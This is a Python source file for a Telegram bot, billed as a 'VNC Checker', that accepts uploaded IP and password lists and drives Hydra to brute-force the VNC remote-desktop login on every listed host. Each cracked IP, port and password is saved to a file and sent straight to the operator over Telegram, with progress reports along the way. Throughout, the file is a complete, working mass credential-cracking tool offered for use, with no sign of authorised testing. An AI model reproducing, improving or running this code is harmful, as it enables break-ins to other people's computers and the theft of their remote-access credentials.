#!/usr/bin/env python3
"""
VNC Checker Telegram Bot - File Upload Version
- Upload files directly via Telegram
- No GitHub files needed!
- Sends results immediately via Telegram
"""

import os
import subprocess
import threading
import time
from datetime import datetime
from pathlib import Path
import asyncio
import sys
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters

# Configuration from environment variables
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
ADMIN_USER_ID = os.environ.get('ADMIN_USER_ID', '')

# Convert ADMIN_USER_ID to int
try:
    ADMIN_USER_ID = int(ADMIN_USER_ID) if ADMIN_USER_ID else 0
except:
    ADMIN_USER_ID = 0

# Files
IP_FILE = 'ips.txt'
PASS_FILE = 'passwords.txt'
OUTPUT_FILE = 'valid_vnc.txt'

# Global state
scan_status = {
    'running': False,
    'total_ips': 0,
    'checked': 0,
    'found': 0,
    'current_ip': '',
    'start_time': None,
    'hits': []
}

files_status = {
    'ips_uploaded': False,
    'passwords_uploaded': False,
    'ips_count': 0,
    'passwords_count': 0
}

scan_lock = threading.Lock()

def check_hydra_installed():
    """Check if Hydra is installed"""
    try:
        result = subprocess.run(['which', 'hydra'], capture_output=True, text=True)
        return result.returncode == 0
    except:
        return False

def check_vnc_with_hydra(ip, port, password_file, threads=4, timeout_sec=300):
    """Check VNC with Hydra"""
    try:
        print(f"[DEBUG] Checking {ip}:{port}...")
        
        cmd = [
            'hydra',
            '-P', password_file,
            '-t', str(threads),
            '-f',
            '-q',
            f'vnc://{ip}:{port}'
        ]
        
        start_time = time.time()
        
        result = subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=timeout_sec,
            text=True
        )
        
        elapsed = time.time() - start_time
        print(f"[DEBUG] {ip}:{port} completed in {elapsed:.1f}s")
        
        output = result.stdout + result.stderr
        
        if '[vnc]' in output.lower() and 'password:' in output.lower():
            for line in output.split('\n'):
                if '[vnc]' in line and 'password:' in line:
                    parts = line.split('password:')
                    if len(parts) > 1:
                        password = parts[1].strip().split()[0]
                        print(f"[HIT] {ip}:{port} | Password: {password}")
                        return True, password
        
        return False, None
        
    except subprocess.TimeoutExpired:
        print(f"[TIMEOUT] {ip}:{port} after {timeout_sec}s")
        return False, None
    except Exception as e:
        print(f"[ERROR] {ip}:{port} - {e}")
        return False, None

def send_message_sync(context, chat_id, message):
    """Send message synchronously from thread"""
    try:
        # Create new event loop for this thread
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        loop.run_until_complete(
            context.bot.send_message(
                chat_id=chat_id,
                text=message,
                parse_mode='HTML'
            )
        )
        loop.close()
        return True
    except Exception as e:
        print(f"Error sending message: {e}")
        return False

def send_hit(context, chat_id, ip, port, password):
    """Send found credential immediately"""
    message = (
        f"🎯 <b>VNC HIT FOUND!</b>\n\n"
        f"🖥 <b>IP:</b> <code>{ip}:{port}</code>\n"
        f"🔑 <b>Password:</b> <code>{password}</code>\n"
        f"⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        f"💾 Saved to: {OUTPUT_FILE}\n"
        f"🎯 Total found: {scan_status['found']}"
    )
    send_message_sync(context, chat_id, message)

def run_scan(context, chat_id, max_ips=None):
    """Run the VNC scan with simple progress updates
    
    Args:
        context: Bot context
        chat_id: Telegram chat ID
        max_ips: Maximum IPs to check (None = all, for testing use 10)
    """
    global scan_status
    
    with scan_lock:
        if scan_status['running']:
            return
        scan_status['running'] = True
        scan_status['start_time'] = datetime.now()
        scan_status['checked'] = 0
        scan_status['found'] = 0
        scan_status['hits'] = []
    
    last_update_time = time.time()
    
    try:
        # Send diagnostic message
        send_message_sync(context, chat_id, "🔍 Loading files...")
        
        # Load IPs
        with open(IP_FILE) as f:
            ips = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        
        # Limit IPs if in test mode
        if max_ips:
            ips = ips[:max_ips]
            test_mode_msg = f" (TEST MODE - First {max_ips} IPs)"
        else:
            test_mode_msg = ""
        
        # Load passwords
        with open(PASS_FILE) as f:
            pass_count = len([line for line in f if line.strip() and not line.startswith('#')])
        
        scan_status['total_ips'] = len(ips)
        
        # Send diagnostic message
        send_message_sync(context, chat_id, f"✅ Loaded {len(ips)} IPs and {pass_count} passwords")
        
        # Check Hydra
        if not check_hydra_installed():
            send_message_sync(context, chat_id, "❌ Hydra not installed!")
            scan_status['running'] = False
            return
        
        send_message_sync(context, chat_id, "✅ Hydra installed and ready")
        
        # Send start message
        start_msg = (
            f"🚀 <b>Scan Started!{test_mode_msg}</b>\n\n"
            f"📊 Total IPs: {len(ips)}\n"
            f"🔐 Passwords: {pass_count}\n"
            f"⚙️ Threads: 4\n"
            f"⏱ Timeout: 60s per IP\n"
            f"⏰ Started: {datetime.now().strftime('%H:%M:%S')}\n\n"
            f"Progress updates every 10 IPs! 📊"
        )
        send_message_sync(context, chat_id, start_msg)
        
        # Initialize output file
        with open(OUTPUT_FILE, 'w') as f:
            f.write("="*70 + "\n")
            f.write("Valid VNC Servers\n")
            f.write(f"Scan started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("="*70 + "\n\n")
        
        # Send diagnostic for first IP
        if ips:
            first_ip = ips[0]
            send_message_sync(context, chat_id, f"🔍 Testing first IP: {first_ip}\n⏱ This may take 10-60 seconds...")
        
        # Check each IP
        for idx, ip_string in enumerate(ips, 1):
            if not scan_status['running']:
                send_message_sync(context, chat_id, "⏹ <b>Scan stopped by user</b>")
                break
            
            # Parse IP:PORT
            if ':' in ip_string:
                ip, port = ip_string.split(':')
                port = int(port)
            else:
                ip = ip_string
                port = 5900
            
            scan_status['current_ip'] = f"{ip}:{port}"
            
            # Send status for first few IPs
            if idx <= 3:
                send_message_sync(context, chat_id, f"🔍 Checking IP {idx}/{len(ips)}: {ip}:{port}")
            
            # Check VNC
            check_start = time.time()
            success, result = check_vnc_with_hydra(ip, port, PASS_FILE, 4, timeout_sec=60)
            check_duration = time.time() - check_start
            
            # Send diagnostic for first few IPs
            if idx <= 3:
                if success:
                    send_message_sync(context, chat_id, f"✅ IP {idx} done in {check_duration:.1f}s - HIT FOUND! 🎯")
                else:
                    send_message_sync(context, chat_id, f"✅ IP {idx} done in {check_duration:.1f}s - No match")
            
            if success:
                scan_status['found'] += 1
                scan_status['hits'].append({
                    'ip': ip,
                    'port': port,
                    'password': result,
                    'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                })
                
                # Save to file
                with open(OUTPUT_FILE, 'a') as f:
                    f.write(f"{ip}:{port} | Password: {result} | Found: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.flush()
                
                # Send immediate notification
                send_hit(context, chat_id, ip, port, result)
            
            scan_status['checked'] = idx
            
            # Send progress update every 10 IPs
            if idx % 10 == 0 or idx == len(ips):
                progress = (idx / len(ips)) * 100
                elapsed = (datetime.now() - scan_status['start_time']).total_seconds()
                
                if idx > 0:
                    eta_total = (elapsed / idx) * len(ips)
                    eta_remaining = eta_total - elapsed
                    eta_str = f"{eta_remaining/60:.1f} min"
                else:
                    eta_str = "Calculating..."
                
                progress_msg = (
                    f"📊 <b>PROGRESS UPDATE</b>\n\n"
                    f"✅ Checked: {idx}/{len(ips)} ({progress:.1f}%)\n"
                    f"🎯 Hits Found: {scan_status['found']}\n"
                    f"⏱ Elapsed: {elapsed/60:.1f} min\n"
                    f"⏳ ETA: {eta_str}\n"
                    f"🔄 Last: {ip}:{port}"
                )
                
                send_message_sync(context, chat_id, progress_msg)
        
        # Final summary
        elapsed = (datetime.now() - scan_status['start_time']).total_seconds()
        
        summary = (
            f"✅ <b>Scan Complete!</b>\n\n"
            f"📊 Total checked: {scan_status['checked']}/{scan_status['total_ips']}\n"
            f"🎯 Valid found: {scan_status['found']}\n"
            f"⏱ Total time: {elapsed/60:.1f} min\n"
            f"💾 Results: {OUTPUT_FILE}"
        )
        
        if scan_status['hits']:
            summary += "\n\n<b>Found credentials:</b>\n"
            for hit in scan_status['hits'][:10]:
                summary += f"• {hit['ip']}:{hit['port']} | {hit['password']}\n"
            if len(scan_status['hits']) > 10:
                summary += f"\n...and {len(scan_status['hits']) - 10} more"
        
        send_message_sync(context, chat_id, summary)
        
    except Exception as e:
        error_msg = f"❌ <b>Scan Error!</b>\n\n{str(e)}"
        send_message_sync(context, chat_id, error_msg)
        print(f"[ERROR] Scan failed: {e}")
        import traceback
        traceback.print_exc()
    finally:
        scan_status['running'] = False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("❌ Unauthorized")
        return
    
    welcome_msg = (
        "🤖 <b>VNC Checker Bot</b>\n\n"
        "Welcome! Let's get started.\n\n"
        "<b>Step 1:</b> Upload your IPs file\n"
        "• Format: IP:PORT (one per line)\n"
        "• Example: 10.0.0.1:5900\n\n"
        "<b>Step 2:</b> Upload your passwords file\n"
        "• One password per line\n\n"
        "<b>Step 3:</b> Start scanning!\n\n"
    )
    
    # Check current status
    if files_status['ips_uploaded']:
        welcome_msg += f"✅ IPs uploaded ({files_status['ips_count']} IPs)\n"
    else:
        welcome_msg += "⏳ Waiting for IPs file...\n"
    
    if files_status['passwords_uploaded']:
        welcome_msg += f"✅ Passwords uploaded ({files_status['passwords_count']} passwords)\n"
    else:
        welcome_msg += "⏳ Waiting for passwords file...\n"
    
    keyboard = [
        [InlineKeyboardButton("📊 Status", callback_data='status')],
        [InlineKeyboardButton("🚀 Start Scan", callback_data='start_scan')],
        [InlineKeyboardButton("🧪 Test (First 10 IPs)", callback_data='test_scan')],
        [InlineKeyboardButton("⏹ Stop Scan", callback_data='stop_scan')],
        [InlineKeyboardButton("📥 Get Results", callback_data='get_results')],
        [InlineKeyboardButton("🗑 Clear Files", callback_data='clear_files')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(welcome_msg, reply_markup=reply_markup, parse_mode='HTML')

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle file uploads"""
    if update.effective_user.id != ADMIN_USER_ID:
        return
    
    document = update.message.document
    file_name = document.file_name.lower()
    
    # Download file
    file = await context.bot.get_file(document.file_id)
    
    # Determine file type based on name or let user specify
    if 'ip' in file_name or file_name == 'ips.txt':
        # IPs file
        await file.download_to_drive(IP_FILE)
        
        # Count IPs
        with open(IP_FILE) as f:
            ip_count = len([line for line in f if line.strip() and not line.startswith('#')])
        
        files_status['ips_uploaded'] = True
        files_status['ips_count'] = ip_count
        
        await update.message.reply_text(
            f"✅ <b>IPs file uploaded!</b>\n\n"
            f"📊 Found {ip_count} IPs\n\n"
            f"{'✅' if files_status['passwords_uploaded'] else '⏳'} Next: Upload passwords file\n"
            f"(Name it 'passwords.txt' or include 'pass' in filename)",
            parse_mode='HTML'
        )
        
    elif 'pass' in file_name or file_name == 'passwords.txt':
        # Passwords file
        await file.download_to_drive(PASS_FILE)
        
        # Count passwords
        with open(PASS_FILE) as f:
            pass_count = len([line for line in f if line.strip() and not line.startswith('#')])
        
        files_status['passwords_uploaded'] = True
        files_status['passwords_count'] = pass_count
        
        await update.message.reply_text(
            f"✅ <b>Passwords file uploaded!</b>\n\n"
            f"🔐 Found {pass_count} passwords\n\n"
            f"{'✅' if files_status['ips_uploaded'] else '⏳'} Next: Upload IPs file\n"
            f"(Name it 'ips.txt' or include 'ip' in filename)",
            parse_mode='HTML'
        )
    
    else:
        # Ask user what file type this is
        keyboard = [
            [InlineKeyboardButton("📋 IPs File", callback_data=f'filetype_ips_{document.file_id}')],
            [InlineKeyboardButton("🔐 Passwords File", callback_data=f'filetype_pass_{document.file_id}')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "❓ <b>What type of file is this?</b>",
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
    
    # Check if both files uploaded
    if files_status['ips_uploaded'] and files_status['passwords_uploaded']:
        keyboard = [[InlineKeyboardButton("🚀 Start Scan Now!", callback_data='start_scan')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"🎉 <b>All files uploaded!</b>\n\n"
            f"📊 IPs: {files_status['ips_count']}\n"
            f"🔐 Passwords: {files_status['passwords_count']}\n\n"
            f"Ready to start scanning!",
            reply_markup=reply_markup,
            parse_mode='HTML'
        )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button presses"""
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id != ADMIN_USER_ID:
        await query.edit_message_text("❌ Unauthorized")
        return
    
    # Handle file type selection
    if query.data.startswith('filetype_'):
        parts = query.data.split('_')
        file_type = parts[1]
        file_id = parts[2]
        
        file = await context.bot.get_file(file_id)
        
        if file_type == 'ips':
            await file.download_to_drive(IP_FILE)
            with open(IP_FILE) as f:
                ip_count = len([line for line in f if line.strip() and not line.startswith('#')])
            files_status['ips_uploaded'] = True
            files_status['ips_count'] = ip_count
            await query.edit_message_text(
                f"✅ <b>Saved as IPs file!</b>\n\n"
                f"📊 Found {ip_count} IPs",
                parse_mode='HTML'
            )
        else:
            await file.download_to_drive(PASS_FILE)
            with open(PASS_FILE) as f:
                pass_count = len([line for line in f if line.strip() and not line.startswith('#')])
            files_status['passwords_uploaded'] = True
            files_status['passwords_count'] = pass_count
            await query.edit_message_text(
                f"✅ <b>Saved as Passwords file!</b>\n\n"
                f"🔐 Found {pass_count} passwords",
                parse_mode='HTML'
            )
        return
    
    if query.data == 'status':
        if scan_status['running']:
            progress = (scan_status['checked'] / scan_status['total_ips'] * 100) if scan_status['total_ips'] > 0 else 0
            elapsed = (datetime.now() - scan_status['start_time']).total_seconds()
            
            message = (
                f"📊 <b>Scan Status: RUNNING ✅</b>\n\n"
                f"✅ Checked: {scan_status['checked']}/{scan_status['total_ips']} ({progress:.1f}%)\n"
                f"🎯 Found: {scan_status['found']}\n"
                f"⏱ Elapsed: {elapsed/60:.1f} min\n"
                f"🔄 Current: {scan_status['current_ip']}"
            )
        else:
            message = (
                f"📊 <b>Scan Status: IDLE</b>\n\n"
                f"Files uploaded:\n"
                f"{'✅' if files_status['ips_uploaded'] else '❌'} IPs: {files_status['ips_count']}\n"
                f"{'✅' if files_status['passwords_uploaded'] else '❌'} Passwords: {files_status['passwords_count']}\n\n"
            )
            if files_status['ips_uploaded'] and files_status['passwords_uploaded']:
                message += "Ready to scan! Tap 'Start Scan'"
            else:
                message += "Upload files to begin"
        
        await query.edit_message_text(message, parse_mode='HTML')
    
    elif query.data == 'start_scan':
        if scan_status['running']:
            await query.edit_message_text("⚠️ Scan already running!")
            return
        
        if not files_status['ips_uploaded']:
            await query.edit_message_text("❌ Please upload IPs file first!")
            return
        
        if not files_status['passwords_uploaded']:
            await query.edit_message_text("❌ Please upload passwords file first!")
            return
        
        # Start scan
        thread = threading.Thread(
            target=run_scan,
            args=(context, query.from_user.id)
        )
        thread.daemon = True
        thread.start()
        
        await query.edit_message_text(
            "🚀 <b>Scan started!</b>\n\n"
            "You'll receive live updates every 3 seconds! 📊",
            parse_mode='HTML'
        )
    
    elif query.data == 'test_scan':
        if scan_status['running']:
            await query.edit_message_text("⚠️ Scan already running!")
            return
        
        if not files_status['ips_uploaded']:
            await query.edit_message_text("❌ Please upload IPs file first!")
            return
        
        if not files_status['passwords_uploaded']:
            await query.edit_message_text("❌ Please upload passwords file first!")
            return
        
        # Test scan (first 10 IPs only)
        thread = threading.Thread(
            target=run_scan,
            args=(context, query.from_user.id, 10)  # Test mode: only 10 IPs
        )
        thread.daemon = True
        thread.start()
        
        await query.edit_message_text(
            "🧪 <b>Test scan started!</b>\n\n"
            "Testing first 10 IPs only...\n"
            "This will help verify if scanning works!",
            parse_mode='HTML'
        )
    
    elif query.data == 'stop_scan':
        if not scan_status['running']:
            await query.edit_message_text("⚠️ No scan running!")
            return
        
        scan_status['running'] = False
        await query.edit_message_text("⏹ Scan stopped!")
    
    elif query.data == 'get_results':
        if Path(OUTPUT_FILE).exists():
            try:
                await context.bot.send_document(
                    chat_id=query.from_user.id,
                    document=open(OUTPUT_FILE, 'rb'),
                    filename=OUTPUT_FILE,
                    caption=f'📥 VNC Results | 🎯 Found: {scan_status["found"]} credentials'
                )
                await query.edit_message_text("✅ Results file sent!")
            except Exception as e:
                await query.edit_message_text(f"❌ Error: {e}")
        else:
            await query.edit_message_text("⚠️ No results yet!")
    
    elif query.data == 'clear_files':
        files_status['ips_uploaded'] = False
        files_status['passwords_uploaded'] = False
        files_status['ips_count'] = 0
        files_status['passwords_count'] = 0
        
        # Delete files
        for f in [IP_FILE, PASS_FILE, OUTPUT_FILE]:
            if Path(f).exists():
                Path(f).unlink()
        
        await query.edit_message_text(
            "🗑 <b>Files cleared!</b>\n\n"
            "Upload new files to start fresh.",
            parse_mode='HTML'
        )

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Status command"""
    if update.effective_user.id != ADMIN_USER_ID:
        return
    
    if scan_status['running']:
        progress = (scan_status['checked'] / scan_status['total_ips'] * 100) if scan_status['total_ips'] > 0 else 0
        elapsed = (datetime.now() - scan_status['start_time']).total_seconds()
        
        message = (
            f"📊 <b>Scan Status</b>\n\n"
            f"✅ Checked: {scan_status['checked']}/{scan_status['total_ips']} ({progress:.1f}%)\n"
            f"🎯 Found: {scan_status['found']}\n"
            f"⏱ Elapsed: {elapsed/60:.1f} min"
        )
    else:
        message = "⏸ No scan running. Upload files and /start!"
    
    await update.message.reply_text(message, parse_mode='HTML')

def main():
    """Start the bot"""
    print("="*60)
    print("VNC Checker Bot - File Upload Version")
    print("="*60)
    
    if not TELEGRAM_BOT_TOKEN:
        print("❌ ERROR: TELEGRAM_BOT_TOKEN not set!")
        sys.exit(1)
    
    if ADMIN_USER_ID == 0:
        print("❌ ERROR: ADMIN_USER_ID not set!")
        sys.exit(1)
    
    print(f"✅ Bot token configured")
    print(f"✅ Admin user ID: {ADMIN_USER_ID}")
    print("="*60)
    
    # Create application
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_handler(CallbackQueryHandler(button_callback))
    
    # Start bot
    print("✅ Bot started! Waiting for file uploads...")
    print("="*60)
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
